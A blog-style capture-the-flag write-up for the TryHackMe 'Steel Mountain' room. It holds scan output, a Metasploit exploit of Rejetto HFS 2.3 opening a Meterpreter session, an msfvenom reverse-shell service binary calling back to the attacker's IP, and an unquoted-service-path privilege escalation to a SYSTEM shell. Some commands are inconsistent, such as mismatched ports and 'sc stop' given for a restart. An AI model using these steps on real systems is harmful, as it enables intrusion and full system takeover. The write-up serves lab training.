---
title: "Steel mountain"
date: 2023-05-13T23:00:31+01:00
draft: false
categories:
  - TryHackMe
---

![steel-mountain](/thm/Steel%20Mountain/steel-mountain.jpeg)

This one is a cool room!

I have been very busy this year and could not play much but decided to give a shot to premium THM nonetheless. I was not disappointed!

## Enumeration

### nmap

```
PORT      STATE SERVICE            REASON  VERSION
80/tcp    open  http               syn-ack Microsoft IIS httpd 8.5
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE

135/tcp   open  msrpc              syn-ack Microsoft Windows RPC

139/tcp   open  netbios-ssn        syn-ack Microsoft Windows netbios-ssn

445/tcp   open  microsoft-ds       syn-ack Microsoft Windows Server 2008 R2 - 2012 microsoft-ds

3389/tcp  open  ssl/ms-wbt-server? syn-ack
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2023-05-07T19:28:23+00:00
|_ssl-date: 2023-05-07T19:28:29+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Issuer: commonName=steelmountain
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2023-05-06T19:25:12
| Not valid after:  2023-11-05T19:25:12
| MD5:   f9f97a5d8acb2a1530d9ba9a5b50cbf4
| SHA-1: 95467e9dc48311a4fc8066ba73bbad58c6a113e1
| -----BEGIN CERTIFICATE-----
| MIIC3jCCAcagAwIBAgIQTfN0vPuWQadKYYGSIdLdtTANBgkqhkiG9w0BAQUFADAY
| MRYwFAYDVQQDEw1zdGVlbG1vdW50YWluMB4XDTIzMDUwNjE5MjUxMloXDTIzMTEw
| NTE5MjUxMlowGDEWMBQGA1UEAxMNc3RlZWxtb3VudGFpbjCCASIwDQYJKoZIhvcN
| AQEBBQADggEPADCCAQoCggEBALpcd+1T8VsF48cF0dyrYgLe5jfFIUzRFOFlbuXh
| RLDTNqD2XHAX+gZ7/sVrA5ibSEuiy+0wFnsTWMjvgVARr3PslvJ8DncY+aTQT93o
| 4TBHQ1Y5EVfuRlq0Ft/SGrWxp1tGy5amjjHWbwapDvk+eBL99DYaVFaJDAxYjg9S
| zAHe2diwupKC+FjSEqf5ht6Lj0K1ESxIK2fNHj8tSWvc7NbcmTS/ia3dzjy+iV6q
| ejytW3yd5qvSLPMEC+ge2SJ3+QZsjWYgmdaR9QN63GaaVzGa3EYDId0o6jiwsV7d
| 2uwDurQZIZg/9nUM0ai7fmZKG/ZPURghOLyoRuWyUQlgJV0CAwEAAaMkMCIwEwYD
| VR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBBQUAA4IB
| AQCzKNLaR0ZvuB+yOXXzxuTIhQAv8rGiLZtuyUjXDcRB4J8LmCKg7woKRTCBremQ
| Uve3ymdPDCXkl6h+B/UC6FFrgQm33JDEfrvDnIAvUrjxXRYxLWylDC/2u2DGI7v6
| LDDHxPf2DZ+WA5hnot7+utzf1mFPRIXFRRUGdM9iLmgIXDyKaUAszkeIV3hBKf92
| jcTFzK7CYJBV7yEMHp0GBf3nDKz4bTFCFZFCXvX9n+XVJs8dwrlp/OX8qKk3IKUY
| sz0ayrKbCCoaumkWOSqqe49yJXIxcRaNIANQCnMwO35eHeQ+ULoogT8AB2B7BAB1
| sAevUn+UPlnhVRq70Efj18oH
|_-----END CERTIFICATE-----

8080/tcp  open  http               syn-ack HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: HFS 2.3
49152/tcp open  msrpc              syn-ack Microsoft Windows RPC
49153/tcp open  msrpc              syn-ack Microsoft Windows RPC
49154/tcp open  msrpc              syn-ack Microsoft Windows RPC
49155/tcp open  msrpc              syn-ack Microsoft Windows RPC
49156/tcp open  msrpc              syn-ack Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-05-07T19:28:23
|_  start_date: 2023-05-07T19:25:00
| nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02a75f0c73cf (unknown)
| Names:
|   STEELMOUNTAIN<20>    Flags: <unique><active>
|   STEELMOUNTAIN<00>    Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
| Statistics:
|   02a75f0c73cf0000000000000000000000
|   0000000000000000000000000000000000
|_  0000000000000000000000000000
|_clock-skew: mean: 1s, deviation: 0s, median: 1s
| smb2-security-mode: 
|   302: 
|_    Message signing enabled but not required
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 6276/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 38069/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 27325/udp): CLEAN (Failed to receive data)
|   Check 4 (port 48829/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

```

Obviously there would be a website on another port! who didn't see it coming?

First the decoy website got us the first answer...

```
<a href="index.html"><img src="/img/logo.png" style="width:500px;height:300px;"/></a>
<h3>Employee of the month</h3>
<img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
```
Lol how this guy got employee of the month?

Then the real stuff...

`rejetto http file server 2.3` looking so vulnerable right now...

Google for the CVE details. Big hint: It's a RCE!

(If you are playing on THM too be careful submitting the answer, remove CVE and just submit the number)

Steel mountain looks more like rubble mountain now

## Exploitation

ok mostly two methods are available here. The `metasploit way` and the `I-download-scripts-manually way` but after doing both I think they are very similar so I won't separate and just go with metasploit (this is a guided room anyway)

setup options acordingly (Do not forget to change the remote TARGET PORT!)

```
msf6 exploit(windows/http/rejetto_hfs_exec) > run

[*] Started reverse TCP handler on 10.8.4.19:4444 
[*] Using URL: http://10.8.4.19:8080/jaISnbG8B
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /jaISnbG8B
[*] Sending stage (175686 bytes) to 10.10.165.223
[!] Tried to delete %TEMP%\WKZRtk.vbs, unknown result
[*] Meterpreter session 1 opened (10.8.4.19:4444 -> 10.10.165.223:49234) at 2023-05-07 20:58:51 +0100
[*] Server stopped.

...
meterpreter > dir
Listing: c:\Users\bill\Desktop
==============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  282   fil   2019-09-27 12:07:07 +0100  desktop.ini
100666/rw-rw-rw-  70    fil   2019-09-27 13:42:38 +0100  user.txt

meterpreter > cat user.txt
��t0t4lly-r34l-st33l-fl4g-n07-f4k3

```
If you see unicode characters in the flag do not worry and just submit it

## Privilege escalation

Download the `Powersploit` powershell script and upload it using the meterpreter

```
meterpreter > upload PowerUp.ps1
[*] Uploading  : /home/nairolf32/Bureau/Hacking/Ctfs/THM/Steel Mountain/PowerUp.ps1 -> PowerUp.ps1
[*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /home/nairolf32/Bureau/Hacking/Ctfs/THM/Steel Mountain/PowerUp.ps1 -> PowerUp.ps1
[*] Completed  : /home/nairolf32/Bureau/Hacking/Ctfs/THM/Steel Mountain/PowerUp.ps1 -> PowerUp.ps1

meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_shell

PS > . .\PowerUp.ps1
PS > Invoke-AllChecks


ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe;
                 IdentityReference=STEELMOUNTAIN\bill; Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
CanRestart     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False
Name           : AWSLiteAgent
Check          : Unquoted Service Paths

...

ServiceName                     : LiveUpdateSvc
Path                            : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFile                  : C:\Program Files (x86)\IObit\LiveUpdate\LiveUpdate.exe
ModifiableFilePermissions       : {WriteAttributes, Synchronize, ReadControl, ReadData/ListDirectory...}
ModifiableFileIdentityReference : STEELMOUNTAIN\bill
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'LiveUpdateSvc'
CanRestart                      : False
Name                            : LiveUpdateSvc
Check                           : Modifiable Service Files


```

Lol who even use Iobit products anymore??

```
└─$ sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.8.4.19 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
[sudo] Mot de passe de nairolf32 : 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of exe-service file: 15872 bytes
Saved as: ASCService.exe
```

Note how I named the file `ASCService.exe` (and not Advanced.exe in the misleading exemple from the hint)

because that is actually the name of the service binary we need to overwrite for our `unquoted service` attack

you can use whatever command to replace/move it to the right path (`copy` command ftw)

Oh yeah you better stop the service before replacing

`sc stop AdvancedSystemCareService9`

And when you are done just prepare another listenner and restart your malicious service

`sc stop AdvancedSystemCareService9`

And then you pwn this machine like a b055!

```
└─$ nc -lnvp 2311
listening on [any] 2311 ...
connect to [10.8.4.19] from (UNKNOWN) [10.10.142.54] 49381
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>

...

c:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 2E4A-906A

 Directory of c:\Users\Administrator\Desktop

10/12/2020  12:05 PM    <DIR>          .
10/12/2020  12:05 PM    <DIR>          ..
10/12/2020  12:05 PM             1,528 activation.ps1
09/27/2019  05:41 AM                32 root.txt
               2 File(s)          1,560 bytes
               2 Dir(s)  44,152,864,768 bytes free

c:\Users\Administrator\Desktop>type root.txt
type root.txt
fl4g_0f_st33l_mR_R0b07_fl4G

```
hehe! nice room! the most interesting part is probably the privilege escalation!

don't forget to leave a readme file with "Leave me here!" as content (It's important!)

aye, take care!
